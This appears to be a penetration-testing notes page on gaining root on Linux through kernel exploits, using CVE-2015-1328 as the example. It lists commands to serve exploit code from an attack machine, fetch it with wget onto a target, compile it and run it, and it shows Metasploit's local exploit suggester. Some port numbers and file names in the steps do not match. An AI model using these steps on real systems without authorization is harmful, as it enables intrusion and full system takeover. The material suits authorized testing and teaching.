# Kernel vulnerability exploits

Become root on Linux via kernel exploit:

1. Identify the kernel version
2. Detect vulnerabilities
3. Develop or acquire exploit code 
4. Transfer the exploit to the target machine
5. Execute the exploit on the target

## Example: CVE-2015-1328

For [CVE-2015-1328](https://ubuntu.com/security/CVE-2015-1328) exploit-db lists several possible exploits:

* [37292](https://www.exploit-db.com/exploits/37292)
* [37293](https://www.exploit-db.com/exploits/37293)
* [40688](https://www.exploit-db.com/exploits/40688) <= Metasploit, maybe there are other exploits too

### Using 37292

1. Create a local file `37292.c` in the `/tmp/` directory and paste the code in the file
2. Start a local python http server: `python -m http.server 8080`
3. From the target machine: `wget http://<IP address attack machine>:8888/37292.c`
4. Compile on target machine: `gcc CVE-2015-1328.c -o 37292`
5. Make executable: `chmod +x 37292`
6. Check current user: `id`
7. Run the compiled exploit: `./exp`
8. Check current user: `id`

### Using 40688

1. Upgrade existing shell (meterpreter, ssh, or a basic command shell) to `meterpreter` session

Open a new meterpreter session with:

```text
sessions -u <number>
```

Or upgrade the most recently opened session to meterpreter:

```text
sessions -u -1
```

2. Load the `local_exploit_suggester` module in `msfconsole`: 

```text
meterpreter> use post/multi/recon/local_exploit_suggester
```

3. Set the SESSION option for the module to the session ID of the meterpreter session, and `run`
4. Test the exploit modules recommended by `local_exploit_suggester`. The first few modules in the output usually 
have a higher chance of working successfully.
5. Load a module, set the module options and `exploit`
6. An exploit can fail for many reasons. If not works, try the next one or install missing components for it to run.

## Notes

A failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of the penetration testing engagement before attempting a kernel exploit.

You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively. 
